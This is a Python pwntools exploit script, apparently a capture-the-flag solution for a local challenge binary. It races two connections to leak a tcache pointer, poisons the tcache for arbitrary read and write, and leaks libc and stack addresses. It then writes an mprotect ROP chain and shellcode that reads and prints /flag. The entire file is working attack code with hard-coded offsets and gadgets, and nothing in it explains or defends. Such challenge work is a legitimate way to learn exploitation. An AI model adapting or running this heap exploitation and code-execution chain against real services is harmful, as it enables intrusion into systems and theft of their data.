import time 
from pwn import *
import os

def leak_tcache(r1, r2):
	if os.fork() == 0:
		for _ in range(10000):
			r1.sendline(b"malloc 0")
			r1.sendline(b"scanf 0")
			r1.sendline(b"AAAABBBB")
			r1.sendline(b"free 0")
		exit(0)
	else:
		for _ in range(10000):
			r2.sendline(b"printf 0")
		os.wait()
	
	output_set = set(r2.clean().splitlines())
	print(output_set)
	for output in output_set:
		output = output[9:]
		if output[:1] != b'\x41' and b'\x07' in output:
			result = output[:6]
			print(result)
			return u64(result.ljust(8, b'\x00'))
			
	return 0

def controlled_allocations_reuse_chunk0(r1, r2, addr, heap_base_addr):
	"""
	HyperCube's solution: Reuse chunk 0 (the one that gave us the leak)
	This ensures we stay in the same heap page with consistent heap_base
	"""
	r1.clean()
	r2.clean()
	
	addr_packed = p64(addr ^ heap_base_addr)
	xor_result = addr ^ heap_base_addr
	print(f"addr: {hex(addr)}")
	print(f"heap_base: {hex(heap_base_addr)}")  
	print(f"XOR result: {hex(xor_result)}")
	
	# Free chunk 0 (the leak chunk) to put it in tcache
	r1.sendline(b"free 0")
	
	# Allocate chunk 1 as our second chunk
	r1.sendline(b"malloc 1")
	r1.sendline(b"free 1")
	
	while True:
		if os.fork() == 0:
			# This might be redundant since chunk 0 is already freed
			r1.sendline(b"free 0")
			os.kill(os.getpid(), 9)
		else:
			# Overwrite chunk 0's next pointer with our target address
			r2.send((b"scanf 0 " + addr_packed + b"\n") * 2000)
			os.wait()
		
		time.sleep(0.1)
		
		# Allocate chunk 0 again (gets the original chunk back)
		r1.sendline(b"malloc 0")
		r1.sendline(b"printf 0")
		r1.readuntil(b"MESSAGE: ")
		stored = r1.readline()[:-1]
		
		if stored == addr_packed.split(b'\x00')[0]:
			break
	
	# Now malloc 1 will return our target address
	r1.sendline(b"malloc 1")
	r1.clean()

def arbitrary_read(r1, r2, addr, heap_base_addr):
	controlled_allocations_reuse_chunk0(r1, r2, addr, heap_base_addr)
	r1.sendline(b"printf 1")
	r1.readuntil(b"MESSAGE: ")
	output = r1.readline()[:-1]
	leak = u64(output.ljust(8, b'\x00'))
	return leak

def arbitrary_write(r1, r2, addr, heap_base_addr, content):
	controlled_allocations_reuse_chunk0(r1, r2, addr, heap_base_addr)
	r1.sendline(b"scanf 1")
	r1.sendline(content)

def exploit(r1, r2, p):
	leak = leak_tcache(r1, r2)
	if leak:
		print("tcache next pointer: ", hex(leak))
		
		# Now all operations use the same heap_base (leak) consistently
		location1 = (leak << 12) + 0x8a0
		libc_leak = arbitrary_read(r1, r2, location1, leak)
		print("libc leak: ", hex(libc_leak))
		
		location2 = libc_leak + 0x60	
		leak3 = arbitrary_read(r1, r2, location2, leak)  # Use same heap_base

		location3 = leak3 - 0x100
		stack_leak = arbitrary_read(r1, r2, location3, leak)  # Use same heap_base
		print("stack_leak: ", hex(stack_leak))
	
		rbp_addr = stack_leak - 0x810
		libc_base = libc_leak - 0x219c80
		
		# gadgets
		binsh_addr = libc_base + 0x1d8698
		setuid = libc_base + 0xec0d0
		system = libc_base + 0x50d70
		pop_rdi = libc_base + 0x000000000002a3e5
		pop_rsi = libc_base + 0x000000000002be51
		pop_rdx = libc_base + 0x00000000000796a2
		execve = libc_base + 0xeb080
		
		libc = p.elf.libc
		context.arch = 'amd64'
		
		print("!!!!! MPROTECT + SHELLCODE !!!!!!")
		
		shellcode = asm('''
		    /* Open the file */
		    push 257
		    pop rax
		    mov rdi, -100       /* dirfd: AT_FDCWD */
		    lea rsi, [rip+flag] /* pointer to "CDr46w9anrq3vg0Z" */
		    xor edx, edx        /* flags: O_RDONLY */
		    syscall

		    /* Read and write in one step */
		    push rax
		    pop rdi
		    xor eax, eax        /* syscall: read */
		    sub rsp, 64         /* smaller buffer */
		    mov rsi, rsp        /* buffer address */
		    mov rdx, 64         /* buffer size */
		    syscall
		    
		    /* Write to stdout */
		    push rax
		    pop rdx
		    mov rax, 1          /* syscall: write */
		    mov rdi, 1          /* fd: stdout */
		    /* rsi already points to our buffer */
		    syscall

		flag:
		    .string "/flag" 
		''')
		
		mprotect_addr = libc_base + libc.symbols['mprotect']
		shellcode_addr = (leak << 12) + 0x1000

		# mprotect(shellcode_addr, 0x1000, 7)
		rop_chain = b""
		rop_chain += p64(pop_rdi)           
		rop_chain += p64(shellcode_addr)    
		rop_chain += p64(pop_rsi)            
		rop_chain += p64(0x1000)            
		rop_chain += p64(pop_rdx)           
		rop_chain += p64(7)                 # PROT_READ|PROT_WRITE|PROT_EXEC
		rop_chain += p64(mprotect_addr)     

		payload = p64(0) + rop_chain + p64(shellcode_addr)

		badchars = b"\x09\x0a\x0b\x0c\x0d\x0e\x20"

		print(f"Checking bad chars (whitespaces)")
		if any(bad in shellcode for bad in badchars):
			print("WARNING: Shellcode contains bad characters!")
			print(f"Shellcode hex: {shellcode.hex()}")
			
		if any(bad in payload for bad in badchars):
			print("WARNING: ROP payload contains bad characters!")
			print(f"Payload hex: {payload.hex()}")
		
		# Use same heap_base for all operations
		arbitrary_write(r1, r2, (leak << 12) + 0x1000, leak, shellcode)
		arbitrary_write(r1, r2, rbp_addr, leak, payload)

		try:
			r1.clean()
			r2.clean()
			p.clean()
			r2.sendline("quit")
			
			response = p.recvall(timeout=2)
			print(response)
		except Exception as e:
			print(f"Final command execution failed: {e}")	
		
		return True
	else:
		print("Failed to leak")
		return False
	
def main(): 
	attempt = 0 
	while True:
		print(f"\nAttempt {attempt + 1}")
		
		try:
			binary = './babyprime_level4.0'
			p = process(binary)
			r1 = remote("localhost", 1337, timeout = 1)
			r2 = remote("localhost", 1337, timeout = 1)

			if exploit(r1, r2, p):
				break 
		except Exception as e:
			print(f"Error in attempt {attempt + 1}: {e}")
		finally:
			try:
				r1.close()
				r2.close()
				p.kill()
			except:
				pass
		attempt += 1

if __name__ == "__main__":
	main()
